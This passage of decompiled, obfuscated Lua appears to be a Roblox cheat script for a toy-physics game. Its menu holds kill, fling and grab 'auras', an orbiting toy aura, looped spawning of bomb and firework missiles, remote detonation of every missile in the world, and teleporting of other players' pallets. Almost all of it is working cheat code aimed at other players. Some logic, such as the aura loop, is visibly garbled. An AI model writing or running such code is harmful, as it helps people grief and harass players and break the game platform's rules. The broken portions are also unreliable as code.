    Flag = "TpToSpawnAuraBind",
    Callback = function(_)
        vu93("Tp To Spawn Aura" .. " is a " .. (not flingaura and "En" or "Dis") .. "abled")
        vu920:Set(not flingaura)
    end
})
v905:CreateKeybind({
    Name = "Fling Aura Bind",
    CurrentKeybind = "",
    HoldToInteract = false,
    Flag = "FlingAuraBind",
    Callback = function(_)
        vu93("Fling Aura" .. " is a " .. (not fling2aura and "En" or "Dis") .. "abled")
        vu926:Set(not fling2aura)
    end
})
v905:CreateKeybind({
    Name = "Kill Aura (void (fast but 65% chance)) Bind",
    CurrentKeybind = "",
    HoldToInteract = false,
    Flag = "KillAuraBind",
    Callback = function(_)
        vu93("Kill Aura (void (fast but 65% chance))" .. " is a " .. (not killaura and "En" or "Dis") .. "abled")
        vu932:Set(not killaura)
    end
})
v905:CreateKeybind({
    Name = "Kill Aura (health (slow but 80% chance) Bind",
    CurrentKeybind = "",
    HoldToInteract = false,
    Flag = "KillAuraBind",
    Callback = function(_)
        vu93("Kill Aura (health (slow but 80% chance)" .. " is a " .. (not killaura1 and "En" or "Dis") .. "abled")
        vu938:Set(not killaura1)
    end
})
v905:CreateKeybind({
    Name = "Grab Aura Bind",
    CurrentKeybind = "",
    HoldToInteract = false,
    Flag = "GrabAuraBind",
    Callback = function(_)
        vu93("Grab Aura" .. " is a " .. (not grabaura and "En" or "Dis") .. "abled")
        vu944:Set(not grabaura)
    end
})
v905:CreateKeybind({
    Name = "Split Aura Bind",
    CurrentKeybind = "",
    HoldToInteract = false,
    Flag = "SplitAuraBind",
    Callback = function(_)
        vu93("Split Aura" .. " is a " .. (not splitaura and "En" or "Dis") .. "abled")
        vu950:Set(not splitaura)
    end
})
v905:CreateKeybind({
    Name = "Freeze Toy Bind",
    CurrentKeybind = "",
    HoldToInteract = false,
    Flag = "FreezeToyBind",
    Callback = function(_)
        vu93("Freeze Toy" .. " is a " .. (not freezetoy and "En" or "Dis") .. "abled")
        vu980:Set(not freezetoy)
    end
})
v905:CreateKeybind({
    Name = "Delete Toy Bind",
    CurrentKeybind = "",
    HoldToInteract = false,
    Flag = "DeleteToyBind",
    Callback = function(_)
        vu93("Delete Toy" .. " is a " .. (not deletetoy and "En" or "Dis") .. "abled")
        vu997:Set(not deletetoy)
    end
})
v905:CreateSection("Toys Aura")
v905:CreateToggle({
    Name = "Aura Toggle",
    CurrentValue = false,
    Callback = function(p1000)
        toyaura = p1000
        local v1001
        repeat
            repeat
                if not (toyaura and task.wait()) then
                    vu12.lat = {}
                    vu8.cat = 0
                    local v1002, v1003, v1004 = pairs(vu1.w:GetDescendants())
                    while true do
                        local v1005
                        v1004, v1005 = v1002(v1003, v1004)
                        if v1004 == nil then
                            break
                        end
                        if v1005.Name == "ovhlat" then
                            local v1006, v1007, v1008 = pairs(v1005.Parent:GetChildren())
                            while true do
                                local v1009
                                v1008, v1009 = v1006(v1007, v1008)
                                if v1008 == nil then
                                    break
                                end
                                if v1009:IsA("Part") then
                                    v1009.CanCollide = true
                                end
                            end
                        end
                        if v1005.Name == "hlat" or (v1005.Name == "ovhlat" or (v1005.Name == "bgat" or v1005.Name == "bpat")) then
                            v1005:Destroy()
                        end
                    end
                    return
                end
                local v1010 = vu7.me.Character
            until v1010 and vu8.cat ~= 0
            v1001 = v1010:FindFirstChild("HumanoidRootPart")
            local v1011 = v1010:FindFirstChild("CamPart")
        until v1001 and v1011
        vu8.cat = 0
        local v1012, v1013, v1014 = pairs(vu12.lat)
        while true do
            local v1015
            v1014, v1015 = v1012(v1013, v1014)
            if v1014 == nil then
                break
            end
            if v1015.Parent then
                vu8.cat = vu8.cat + 1
            end
        end
        if hat then
            vu8.chal = vu8.chal - vu8.chal - vu8.chal
        end
        if dyat then
            vu8.cdyat = vu8.cdyat - vu8.cdyat - vu8.cdyat
        end
        local v1016, v1017, v1018 = pairs(vu12.lat)
        if v1048.Parent then
            local v1019 = v1048:FindFirstChild("PartOwnerValue")
            local v1020 = v1048:FindFirstChild("ovhlat")
            local v1021
            if v1019 then
                v1021 = v1019.Value
                v1018 = v1047
            else
                local v1022, v1023, v1024 = pairs(v1048:GetChildren())
                v1018 = v1047
                while true do
                    v1024, v1021 = v1022(v1023, v1024)
                    if v1024 == nil then
                        v1021 = v1019
                    end
                    if v1021:IsA("Part") and v1021.CanQuery then
                        local v1025 = Instance.new("ObjectValue")
                        v1025.Parent = v1048
                        v1025.Name = "PartOwnerValue"
                        v1025.Value = v1021
                    end
                end
            end
            local v1026
            if v1020 then
                v1026 = v1020.Value
                v1026.Enabled = false
            else
                v1026 = Instance.new("Highlight", vu1.w.hls)
                v1026.Name = "hlat"
                v1026.Adornee = v1048
                v1026.OutlineColor = Color3.fromRGB(0, 0, 0)
                v1026.FillColor = Color3.fromRGB(0, 0, 0)
                v1026.OutlineTransparency = 0
                v1026.FillTransparency = 0.5
                local v1027 = Instance.new("ObjectValue", v1048)
                v1027.Name = "ovhlat"
                v1027.Value = v1026
            end
            if vizat then
                v1026.Enabled = true
            end
            if v1021 then
                local v1028 = v1021:FindFirstChild("bgat")
                v1021:FindFirstChild("PartOwner")
                local v1029 = v1021:FindFirstChild("bpat")
                if not v1028 then
                    v1028 = Instance.new("BodyGyro", v1021)
                    v1028.MaxTorque = vu8.V.mhv3
                    v1028.D = 100
                    v1028.Name = "bgat"
                end
                if not v1029 then
                    v1029 = Instance.new("BodyPosition", v1021)
                    v1029.MaxForce = vu8.V.mhv3
                    v1029.D = 100
                    v1029.Name = "bpat"
                end
                vu410(v1021, v1001, v1026, vu8.C2)
                local v1030 = v1048:FindFirstChild("HoldPart")
                if v1030 then
                    local v1031 = v1030:FindFirstChild("RigidConstraint")
                    local v1032 = v1031 and v1031.Attachment1
                    if v1032 then
                        vu410(v1032.Parent.Parent.Head, v1001, v1026, vu8.C2)
                    end
                end
                if (v1048.Name == "DiceBig" or v1048.Name == "DiceSmall") and rgb then
                    vu411(v1021)
                    task.wait()
                end
                local v1033, v1034, v1035 = pairs(v1048:GetDescendants())
                while true do
                    local v1036
                    v1035, v1036 = v1033(v1034, v1035)
                    if v1035 == nil then
                        break
                    end
                    if v1036:IsA("BasePart") then
                        v1036.CanCollide = false
                    end
                end
                if hatta then
                    v1026.FillColor = Color3.fromRGB(0, 255, 255)
                    local v1037 = v1047 * (2 * math.pi / vu8.cat)
                    local v1038 = math.cos(v1037) * 100
                    local v1039 = math.sin(v1037) * 100
                    local v1040 = v1001.CFrame * CFrame.new(v1038, - 1000, v1039)
                    v1028.CFrame = v1040
                    v1029.Position = v1040.p
                    v1026.FillColor = Color3.fromRGB(0, 0, 255)
                else
                    if vu11.spat and vu11.spat.Parent then
                        v1001 = vu11.spat
                    end
                    v1026.FillColor = Color3.fromRGB(0, 255, 255)
                    local v1041 = v1047 * (2 * math.pi / vu8.cat)
                    if StepEnable then
                        v1041 = v1047 * (2 * math.pi / vu8.cat) + math.pi * (vu8.step / 5400)
                    end
                    local v1042 = math.cos(v1041) * (vu8.dta + vu8.cat + vu8.chal)
                    local v1043 = math.sin(v1041) * (vu8.dta + vu8.cat + vu8.chal)
                    if squat then
                        if math.cos(math.pi / 4) * (vu8.dta + vu8.cat + vu8.chal) < v1042 then
                            v1042 = math.cos(math.pi / 4) * (vu8.dta + vu8.cat + vu8.chal)
                        end
                        if math.cos(math.pi / 4) * (vu8.dta + vu8.cat + vu8.chal) < v1043 then
                            v1043 = math.cos(math.pi / 4) * (vu8.dta + vu8.cat + vu8.chal)
                        end
                        if v1042 < - (math.cos(math.pi / 4) * (vu8.dta + vu8.cat + vu8.chal)) then
                            v1042 = - (math.cos(math.pi / 4) * (vu8.dta + vu8.cat + vu8.chal))
                        end
                        if v1043 < - (math.cos(math.pi / 4) * (vu8.dta + vu8.cat + vu8.chal)) then
                            v1043 = - (math.cos(math.pi / 4) * (vu8.dta + vu8.cat + vu8.chal))
                        end
                    end
                    local v1044 = v1001.CFrame * CFrame.new(v1042, vu8.hta + vu8.cdyat, v1043)
                    local v1045 = Vector3.new(v1042, vu8.hta + vu8.cdyat, v1043)
                    if xyat then
                        v1044 = v1001.CFrame * CFrame.new(v1042, v1043, vu8.hta + vu8.cdyat)
                        v1045 = Vector3.new(v1042, v1043, vu8.hta + vu8.cdyat)
                    elseif yzat then
                        v1044 = v1001.CFrame * CFrame.new(vu8.hta + vu8.cdyat, v1042, v1043)
                        v1045 = Vector3.new(vu8.hta + vu8.cdyat, v1042, v1043)
                    end
                    local v1046 = v1044.p
                    if lokat then
                        v1044 = CFrame.new(v1044.p, v1001.Position)
                    end
                    if lckat then
                        v1046 = v1001.Position + v1045
                    end
                    if slkat then
                        v1044 = v1011.CFrame
                    end
                    v1028.CFrame = v1044
                    v1029.Position = v1046
                    v1028.CFrame = v1028.CFrame * CFrame.Angles(math.rad(vu8.xrta), math.rad(vu8.yrta), math.rad(vu8.zrta))
                    if StepEnable then
                        vu8.step = vu8.step + vu8.RawStep
                    else
                        vu8.step = 0
                    end
                    v1026.FillColor = Color3.fromRGB(0, 255, 0)
                    v1001 = vu7.me.Character.HumanoidRootPart
                end
                if pwat then
                    task.wait()
                end
            end
        else
            v1018 = v1047
        end
        local v1047, v1048 = v1016(v1017, v1018)
        if v1047 ~= nil then
        else
        end
        if pwaat then
            task.wait()
        end
    end
})
v905:CreateToggle({
    Name = "Spawn Toy Toggle",
    CurrentValue = false,
    Flag = "SpawnToyToggle",
    Callback = function(p1049)
        sttta = p1049
    end
})
v905:CreateToggle({
    Name = "Hide Aura Toggle",
    CurrentValue = false,
    Flag = "HideAuraToggle",
    Callback = function(p1050)
        hatta = p1050
    end
})
v905:CreateToggle({
    Name = "Safe Mode Toggle",
    CurrentValue = false,
    Flag = "SafeModeToggle",
    Callback = function(p1051)
        sfat = p1051
    end
})
v905:CreateToggle({
    Name = "Visualize Toggle",
    CurrentValue = false,
    Flag = "VisualizeToggle",
    Callback = function(p1052)
        vizat = p1052
    end
})
v905:CreateToggle({
    Name = "Rotation Toggle",
    CurrentValue = false,
    Flag = "RotationToggle",
    Callback = function(p1053)
        StepEnable = p1053
    end
})
v905:CreateSlider({
    Name = "Rotation Slider",
    Range = {
        1,
        100
    },
    Increment = 1,
    Suffix = "",
    CurrentValue = 5,
    Flag = "RotationSlider",
    Callback = function(p1054)
        vu8.RawStep = p1054
    end
})
v905:CreateSlider({
    Name = "Distance Slider",
    Range = {
        - 100,
        100
    },
    Increment = 1,
    Suffix = "",
    CurrentValue = 10,
    Flag = "DistanceSlider",
    Callback = function(p1055)
        vu8.dta = p1055
    end
})
v905:CreateSlider({
    Name = "Hight Slider",
    Range = {
        - 100,
        100
    },
    Increment = 1,
    Suffix = "",
    CurrentValue = - 2,
    Flag = "HightSlider",
    Callback = function(p1056)
        vu8.hta = p1056
    end
})
v905:CreateSlider({
    Name = "X Rotation",
    Range = {
        - 180,
        180
    },
    Increment = 1,
    Suffix = "",
    CurrentValue = 0,
    Flag = "XRotation",
    Callback = function(p1057)
        vu8.xrta = p1057
    end
})
v905:CreateSlider({
    Name = "Y Rotation",
    Range = {
        - 180,
        180
    },
    Increment = 1,
    Suffix = "",
    CurrentValue = 0,
    Flag = "YRotation",
    Callback = function(p1058)
        vu8.yrta = p1058
    end
})
v905:CreateSlider({
    Name = "Z Rotation",
    Range = {
        - 180,
        180
    },
    Increment = 1,
    Suffix = "",
    CurrentValue = 0,
    Flag = "ZRotation",
    Callback = function(p1059)
        vu8.zrta = p1059
    end
})
v905:CreateToggle({
    Name = "Look At Toggle",
    CurrentValue = false,
    Flag = "LookAtToggle",
    Callback = function(p1060)
        lokat = p1060
    end
})
v905:CreateToggle({
    Name = "Lock Toggle",
    CurrentValue = false,
    Flag = "LockToggle",
    Callback = function(p1061)
        lckat = p1061
    end
})
v905:CreateToggle({
    Name = "Sync Look Toggle",
    CurrentValue = false,
    Flag = "SyncLookToggle",
    Callback = function(p1062)
        slkat = p1062
    end
})
v905:CreateToggle({
    Name = "XY Toggle",
    CurrentValue = false,
    Flag = "XYToggle",
    Callback = function(p1063)
        xyat = p1063
    end
})
v905:CreateToggle({
    Name = "YZ Toggle",
    CurrentValue = false,
    Flag = "YZToggle",
    Callback = function(p1064)
        yzat = p1064
    end
})
v905:CreateToggle({
    Name = "Square Toggle",
    CurrentValue = false,
    Flag = "SquareToggle",
    Callback = function(p1065)
        squat = p1065
    end
})
v905:CreateToggle({
    Name = "+1 wait",
    CurrentValue = false,
    Flag = "+1wait",
    Callback = function(p1066)
        pwaat = p1066
    end
})
v905:CreateToggle({
    Name = "+wait from all toys",
    CurrentValue = false,
    Flag = "+waitfromalltoy",
    Callback = function(p1067)
        pwat = p1067
    end
})
v905:CreateToggle({
    Name = "Destabilize Distance (+-1000)",
    CurrentValue = false,
    Flag = "DestabilizeDistance(+-1000)",
    Callback = function(p1068)
        hat = p1068
        if p1068 then
            vu8.chal = 1000
        else
            vu8.chal = 0
        end
    end
})
v905:CreateToggle({
    Name = "Destabilize Hight (+-1000)",
    CurrentValue = false,
    Flag = "DestabilizeHight(+-1000)",
    Callback = function(p1069)
        dyat = p1069
        if p1069 then
            vu8.cdyat = 1000
        else
            vu8.cdyat = 0
        end
    end
})
v905:CreateKeybind({
    Name = "Select Center Part",
    CurrentKeybind = "",
    HoldToInteract = false,
    Flag = "SelectCenterPart",
    Callback = function(_)
        local v1070 = vu7.mouse.target
        local v1071 = vu7.me.Character
        if v1071 then
            local v1072 = vu7.me.Character:FindFirstChild("HumanoidRootPart")
            v1071 = v1072 and 1 or v1072
        end
        local v1073 = vu11
        if not v1070 then
            if v1071 == 1 then
                v1070 = vu7.me.Character.HumanoidRootPart
            else
                v1070 = false
            end
        end
        v1073.spat = v1070
    end
})
v905:CreateKeybind({
    Name = "Reset Center Part",
    CurrentKeybind = "",
    HoldToInteract = false,
    Flag = "ResetCenterPart",
    Callback = function(_)
        local v1074 = vu7.me.Character
        if v1074 then
            local v1075 = vu7.me.Character:FindFirstChild("HumanoidRootPart")
            v1074 = v1075 and 1 or v1075
        end
        local v1076 = vu11
        local v1077
        if v1074 == 1 then
            v1077 = vu7.me.Character.HumanoidRootPart
        else
            v1077 = false
        end
        v1076.spat = v1077
    end
})
v905:CreateKeybind({
    Name = "Add toy",
    CurrentKeybind = "",
    HoldToInteract = false,
    Flag = "Addtoy",
    Callback = function(_)
        local v1078 = vu7.mouse.target
        if v1078 then
            if v1078.CollisionGroup ~= "Items" or v1078.Anchored then
                if v1078.CollisionGroup == "Players" then
                    table.insert(vu12.lat, v1078.Parent.Head)
                    vu8.cat = vu8.cat + 1
                end
            else
                table.insert(vu12.lat, v1078.Parent)
                vu8.cat = vu8.cat + 1
            end
        end
    end
})
local v1079 = v491:CreateTab("Toys Menu", 7733946818)
v1079:CreateSection("Bomb Missile")
v1079:CreateKeybind({
    Name = "Spawn Explosion",
    CurrentKeybind = "",
    HoldToInteract = false,
    Flag = "SpawnExplosionBind",
    Callback = function(_)
        local vu1080 = vu408("HumanoidRootPart")
        if vu1080 then
            local vu1081 = vu7.mouse.Target
            local vu1082 = vu7.mouse.Hit
            local function v1084()
                task.spawn(vu223, "BombMissile")
                while not vu7.backpack:FindFirstChild("BombMissile") do
                    task.wait()
                end
                local v1083 = vu7.backpack.BombMissile
                vu410(v1083.HitboxBodyTop, vu1080)
                if vu1081 then
                    vu229(v1083.PartHitDetector, vu1081, vu1082.Position)
                else
                    vu229(v1083.PartHitDetector, v1083.PartHitDetector, v1083.PartHitDetector.Position)
                end
            end
            if vu7.backpack:FindFirstChild("BombMissile") then
                local v1085, v1086, v1087 = pairs(vu7.backpack:GetChildren())
                while true do
                    local v1088
                    v1087, v1088 = v1085(v1086, v1087)
                    if v1087 == nil then
                        break
                    end
                    if v1088.Name == "BombMissile" then
                        v1088.Name = "BombMissile-o"
                    end
                end
                v1084()
                local v1089, v1090, v1091 = pairs(vu7.backpack:GetChildren())
                while true do
                    local v1092
                    v1091, v1092 = v1089(v1090, v1091)
                    if v1091 == nil then
                        break
                    end
                    if v1092.Name == "BombMissile-o" then
                        v1092.Name = "BombMissile"
                    end
                end
            else
                v1084()
            end
        end
    end
})
v1079:CreateToggle({
    Name = "Loop Spawn",
    CurrentValue = false,
    Callback = function(p1093)
        loopspawnrocket = p1093
        while loopspawnrocket and task.wait() do
            local v1094 = vu7.me.Character
            if v1094 and (vu7.me.CanSpawnToy.Value and v1094:FindFirstChild("HumanoidRootPart")) then
                task.spawn(spawn_toy, "BombMissile", CFrame.new(593.813354, 69.5489578, 158.756714, - 0.72231704, - 0.555175185, 0.412357271, - 4.23192978e-6, 0.596272945, 0.802781761, - 0.691562057, 0.579861224, - 0.430700451))
            end
        end
    end
})
v1079:CreateKeybind({
    Name = "Explode All My",
    CurrentKeybind = "",
    HoldToInteract = false,
    Flag = "ExplodeAllMyBombMissile",
    Callback = function(_)
        local v1095 = vu7.me.Character
        local v1096 = v1095 and v1095:FindFirstChild("HumanoidRootPart")
        if v1096 then
            local _ = v1096.CFrame
            local v1097 = vu7.mouse.Target
            local v1098 = vu7.mouse.Hit
            local v1099, v1100, v1101 = pairs(vu7.backpack:GetChildren())
            local v1102 = {}
            while true do
                local v1103
                v1101, v1103 = v1099(v1100, v1101)
                if v1101 == nil then
                    break
                end
                if v1103.Name == "BombMissile" then
                    local v1104 = v1103:FindFirstChild("HitboxBodyTop")
                    if v1104 then
                        vu410(v1104, v1096)
                        table.insert(v1102, v1103)
                    end
                end
            end
            local v1105, v1106, v1107 = pairs(v1102)
            while true do
                local v1108
                v1107, v1108 = v1105(v1106, v1107)
                if v1107 == nil then
                    break
                end
                if v1097 then
                    vu229(v1108.HitboxBodyTop, v1097, v1098.Position)
                else
                    vu229(v1108.HitboxBodyTop, v1096, v1096.Position)
                end
            end
        end
    end
})
v1079:CreateKeybind({
    Name = "Explode All",
    CurrentKeybind = "",
    HoldToInteract = false,
    Flag = "ExplodeAllBombMissile",
    Callback = function(_)
        local v1109 = vu7.me.Character
        local v1110 = v1109 and v1109:FindFirstChild("HumanoidRootPart")
        if v1110 then
            local v1111 = v1110.CFrame
            local v1112 = vu7.mouse.Target
            local v1113 = vu7.mouse.Hit
            local v1114, v1115, v1116 = pairs(vu1.w:GetDescendants())
            local v1117 = {}
            while true do
                local v1118
                v1116, v1118 = v1114(v1115, v1116)
                if v1116 == nil then
                    break
                end
                if v1118.Name == "BombMissile" then
                    local v1119 = v1118:FindFirstChild("HitboxBodyTop")
                    if v1119 then
                        vu410(v1119, v1110)
                        table.insert(v1117, v1118)
                    end
                end
            end
            v1110.CFrame = v1111
            local v1120, v1121, v1122 = pairs(v1117)
            while true do
                local v1123
                v1122, v1123 = v1120(v1121, v1122)
                if v1122 == nil then
                    break
                end
                if v1112 then
                    vu229(v1123.PartHitDetector, v1112, v1113.Position)
                else
                    vu229(v1123.PartHitDetector, v1110, v1110.Position)
                end
            end
        end
    end
})
v1079:CreateSection("Firework Missile")
v1079:CreateKeybind({
    Name = "Spawn Explosion",
    CurrentKeybind = "",
    HoldToInteract = false,
    Flag = "SpawnFireworkExplosionBind",
    Callback = function(_)
        local vu1124 = vu408("HumanoidRootPart")
        if vu1124 then
            local vu1125 = vu7.mouse.Target
            local vu1126 = vu7.mouse.Hit
            local function v1128()
                task.spawn(vu223, "FireworkMissile")
                while not vu7.backpack:FindFirstChild("FireworkMissile") do
                    task.wait()
                end
                local v1127 = vu7.backpack.FireworkMissile
                vu410(v1127.HitboxBodyTop, vu1124)
                if vu1125 then
                    vu229(v1127.PartHitDetector, vu1125, vu1126.Position)
                else
                    vu229(v1127.PartHitDetector, v1127.PartHitDetector, v1127.PartHitDetector.Position)
                end
            end
            if vu7.backpack:FindFirstChild("FireworkMissile") then
                local v1129, v1130, v1131 = pairs(vu7.backpack:GetChildren())
                while true do
                    local v1132
                    v1131, v1132 = v1129(v1130, v1131)
                    if v1131 == nil then
                        break
                    end
                    if v1132.Name == "FireworkMissile" then
                        v1132.Name = "FireworkMissile-o"
                    end
                end
                v1128()
                local v1133, v1134, v1135 = pairs(vu7.backpack:GetChildren())
                while true do
                    local v1136
                    v1135, v1136 = v1133(v1134, v1135)
                    if v1135 == nil then
                        break
                    end
                    if v1136.Name == "FireworkMissile-o" then
                        v1136.Name = "FireworkMissile"
                    end
                end
            else
                v1128()
            end
        end
    end
})
v1079:CreateToggle({
    Name = "Loop Spawn",
    CurrentValue = false,
    Callback = function(p1137)
        loopspawnfireworkrocket = p1137
        while loopspawnfireworkrocket and task.wait() do
            local v1138 = vu7.me.Character
            if v1138 and (vu7.me.CanSpawnToy.Value and v1138:FindFirstChild("HumanoidRootPart")) then
                task.spawn(spawn_toy, "FireworkMissile", CFrame.new(593.813354, 69.5489578, 158.756714, - 0.72231704, - 0.555175185, 0.412357271, - 4.23192978e-6, 0.596272945, 0.802781761, - 0.691562057, 0.579861224, - 0.430700451))
            end
        end
    end
})
v1079:CreateKeybind({
    Name = "Explode All My",
    CurrentKeybind = "",
    HoldToInteract = false,
    Flag = "ExplodeAllMyFireworkMissile",
    Callback = function(_)
        local v1139 = vu7.me.Character
        local v1140 = v1139 and v1139:FindFirstChild("HumanoidRootPart")
        if v1140 then
            local v1141 = v1140.CFrame
            local v1142 = vu7.mouse.Target
            local v1143 = vu7.mouse.Hit
            local v1144, v1145, v1146 = pairs(vu7.backpack:GetChildren())
            local v1147 = {}
            while true do
                local v1148
                v1146, v1148 = v1144(v1145, v1146)
                if v1146 == nil then
                    break
                end
                if v1148.Name == "FireworkMissile" then
                    local v1149 = v1148:FindFirstChild("HitboxBodyTop")
                    if v1149 then
                        vu410(v1149, v1140)
                        table.insert(v1147, v1148)
                    end
                end
            end
            v1140.CFrame = v1141
            local v1150, v1151, v1152 = pairs(v1147)
            while true do
                local v1153
                v1152, v1153 = v1150(v1151, v1152)
                if v1152 == nil then
                    break
                end
                if v1142 then
                    vu229(v1153.HitboxBodyTop, v1142, v1143.Position)
                else
                    vu229(v1153.HitboxBodyTop, v1140, v1140.Position)
                end
            end
        end
    end
})
v1079:CreateKeybind({
    Name = "Explode All",
    CurrentKeybind = "",
    HoldToInteract = false,
    Flag = "ExplodeAllFireworkMissile",
    Callback = function(_)
        local v1154 = vu7.me.Character
        local v1155 = v1154 and v1154:FindFirstChild("HumanoidRootPart")
        if v1155 then
            local v1156 = v1155.CFrame
            local v1157 = vu7.mouse.Target
            local v1158 = vu7.mouse.Hit
            local v1159, v1160, v1161 = pairs(vu1.w:GetDescendants())
            local v1162 = {}
            while true do
                local v1163
                v1161, v1163 = v1159(v1160, v1161)
                if v1161 == nil then
                    break
                end
                if v1163.Name == "FireworkMissile" then
                    local v1164 = v1163:FindFirstChild("HitboxBodyTop")
                    if v1164 then
                        vu410(v1164, v1155)
                        table.insert(v1162, v1163)
                    end
                end
            end
            v1155.CFrame = v1156
            local v1165, v1166, v1167 = pairs(v1162)
            while true do
                local v1168
                v1167, v1168 = v1165(v1166, v1167)
                if v1167 == nil then
                    break
                end
                if v1157 then
                    vu229(v1168.PartHitDetector, v1157, v1158.Position)
                else
                    vu229(v1168.PartHitDetector, v1155, v1155.Position)
                end
            end
        end
    end
})
v1079:CreateSection("Bomb Balloon")
v1079:CreateKeybind({
    Name = "Spawn Explosion",
    CurrentKeybind = "",
    HoldToInteract = false,
    Flag = "SpawnBombBalloonExplosionBind",
    Callback = function(_)
        local vu1169 = vu408("HumanoidRootPart")
        if vu1169 then
            local vu1170 = vu7.mouse.Target
            local vu1171 = vu7.mouse.Hit
            local function v1173()
                task.spawn(vu223, "BombBalloon")
                while not vu7.backpack:FindFirstChild("BombBalloon") do
                    task.wait()
                end
                local v1172 = vu7.backpack.BombBalloon
                vu410(v1172.Balloon, vu1169)
                if vu1170 then
                    vu229(v1172.Balloon, vu1170, vu1171.Position)
                else
                    vu229(v1172.Balloon, v1172.Balloon, v1172.Balloon.Position)
                end
            end
            if vu7.backpack:FindFirstChild("BombBalloon") then
                local v1174, v1175, v1176 = pairs(vu7.backpack:GetChildren())
                while true do
                    local v1177
                    v1176, v1177 = v1174(v1175, v1176)
                    if v1176 == nil then
                        break
                    end
                    if v1177.Name == "BombBalloon" then
                        v1177.Name = "BombBalloon-o"
                    end
                end
                v1173()
                local v1178, v1179, v1180 = pairs(vu7.backpack:GetChildren())
                while true do
                    local v1181
                    v1180, v1181 = v1178(v1179, v1180)
                    if v1180 == nil then
                        break
                    end
                    if v1181.Name == "BombBalloon-o" then
                        v1181.Name = "BombBalloon"
                    end
                end
            else
                v1173()
            end
        end
    end
})
v1079:CreateToggle({
    Name = "Loop Spawn",
    CurrentValue = false,
    Callback = function(p1182)
        loopspawnBombBalloon = p1182
        while loopspawnBombBalloon and task.wait() do
            local v1183 = vu7.me.Character
            if v1183 and (vu7.me.CanSpawnToy.Value and v1183:FindFirstChild("HumanoidRootPart")) then
                task.spawn(spawn_toy2, "BombBalloon", CFrame.new(- 370.657013, - 7.35040474, - 353.104187, - 0.805483878, 4.36763976e-8, - 0.592617691, 5.60510038e-8, 1, - 2.48352827e-9, 0.592617691, - 3.52172584e-8, - 0.805483878))
            end
        end
    end
})
v1079:CreateKeybind({
    Name = "Explode All My",
    CurrentKeybind = "",
    HoldToInteract = false,
    Flag = "ExplodeAllMyBombBalloon",
    Callback = function(_)
        local v1184 = vu7.me.Character
        local v1185 = v1184 and v1184:FindFirstChild("HumanoidRootPart")
        if v1185 then
            local v1186 = v1185.CFrame
            local v1187 = vu7.mouse.Target
            local v1188 = vu7.mouse.Hit
            local v1189, v1190, v1191 = pairs(vu7.backpack:GetChildren())
            local v1192 = {}
            while true do
                local v1193
                v1191, v1193 = v1189(v1190, v1191)
                if v1191 == nil then
                    break
                end
                if v1193.Name == "BombBalloon" then
                    local v1194 = v1193:FindFirstChild("Balloon")
                    if v1194 then
                        vu410(v1194, v1185)
                        table.insert(v1192, v1193)
                    end
                end
            end
            v1185.CFrame = v1186
            local v1195, v1196, v1197 = pairs(v1192)
            while true do
                local v1198
                v1197, v1198 = v1195(v1196, v1197)
                if v1197 == nil then
                    break
                end
                if v1187 then
                    vu229(v1198.Balloon, v1187, v1188.Position)
                else
                    vu229(v1198.Balloon, v1185, v1185.Position)
                end
            end
        end
    end
})
v1079:CreateKeybind({
    Name = "Explode All",
    CurrentKeybind = "",
    HoldToInteract = false,
    Flag = "ExplodeAllBombBalloon",
    Callback = function(_)
        local v1199 = vu7.me.Character
        local v1200 = v1199 and v1199:FindFirstChild("HumanoidRootPart")
        if v1200 then
            local v1201 = v1200.CFrame
            local v1202 = vu7.mouse.Target
            local v1203 = vu7.mouse.Hit
            local v1204, v1205, v1206 = pairs(vu1.w:GetDescendants())
            local v1207 = {}
            while true do
                local v1208
                v1206, v1208 = v1204(v1205, v1206)
                if v1206 == nil then
                    break
                end
                if v1208.Name == "BombBalloon" then
                    local v1209 = v1208:FindFirstChild("Balloon")
                    if v1209 then
                        vu410(v1209, v1200)
                        table.insert(v1207, v1208)
                    end
                end
            end
            v1200.CFrame = v1201
            local v1210, v1211, v1212 = pairs(v1207)
            while true do
                local v1213
                v1212, v1213 = v1210(v1211, v1212)
                if v1212 == nil then
                    break
                end
                if v1202 then
                    vu229(v1213.Balloon, v1202, v1203.Position)
                else
                    vu229(v1213.Balloon, v1200, v1200.Position)
                end
            end
        end
    end
})
v1079:CreateSection("Spawn")
local vu1217 = v1079:CreateToggle({
    Name = "Loop Spawn",
    CurrentValue = false,
    Callback = function(p1214)
        loopspawn = p1214
        while loopspawn and task.wait() do
            local v1215 = vu7.me.Character
            if v1215 then
                local v1216 = vu7.me.Character:FindFirstChild("HumanoidRootPart") and vu7.me.CanSpawnToy.Value
                v1215 = v1216 and 1 or v1216
            end
            if v1215 == 1 then
                local _ = vu7.me.Character.HumanoidRootPart.CFrame
                task.spawn(vu223)
            end
        end
    end
})
v1079:CreateKeybind({
    Name = "Loop Spawn Bind",
    CurrentKeybind = "",
    HoldToInteract = false,
    Flag = "LoopSpawnBind",
    Callback = function(_)
        vu93("Loop Spawn" .. " is a " .. (not loopspawn and "En" or "Dis") .. "abled")
        vu1217:Set(not loopspawn)
    end
})
v1079:CreateSection("Delete")
v1079:CreateButton({
    Name = "Delete All My Toys",
    Callback = function()
        local v1218, v1219, v1220 = pairs(vu7.backpack:GetChildren())
        while true do
            local v1221
            v1220, v1221 = v1218(v1219, v1220)
            if v1220 == nil then
                break
            end
            vu7.Events.DestroyToyEvent:FireServer(v1221)
            task.wait(0.1)
        end
    end
})
v1079:CreateButton({
    Name = "Tp All Pallets",
    Callback = function()
        local v1222, v1223 = vu192()
        if v1223 and vu413(v1223) then
            local v1224 = v1222.CFrame
            local v1225, v1226, v1227 = ipairs(Players:GetPlayers())
            while true do
                local v1228
                v1227, v1228 = v1225(v1226, v1227)
                if v1227 == nil then
                    break
                end
                if v1228 ~= vu7.me and (vu56(v1228.Name) and vu120(v1228.Name)) and vu1.w:FindFirstChild(v1228.Name .. "SpawnedInToys") then
                    local v1229, v1230, v1231 = pairs(vu1.w[v1228.Name .. "SpawnedInToys"]:GetChildren())
                    while true do
                        local v1232
                        v1231, v1232 = v1229(v1230, v1231)
                        if v1231 == nil then
                            break
                        end
                        local v1233 = vu199(v1232)
                        if v1232.Name == "PalletLightBrown" and v1233 then
                            vu410(v1233, v1222)
                            v1233.CFrame = vu11.tptoypos
                        end
                    end
                end
            end
            v1222.CFrame = v1224
        end
    end
})
v1079:CreateButton({
    Name = "Tp All Pallets(tower)",
    Callback = function()
        local v1234, v1235 = vu192()
        if v1235 and vu413(v1235) then
            local v1236 = v1234.CFrame
            local v1237, v1238, v1239 = ipairs(Players:GetPlayers())
            while true do
                local v1240
                v1239, v1240 = v1237(v1238, v1239)
                if v1239 == nil then
                    break
                end
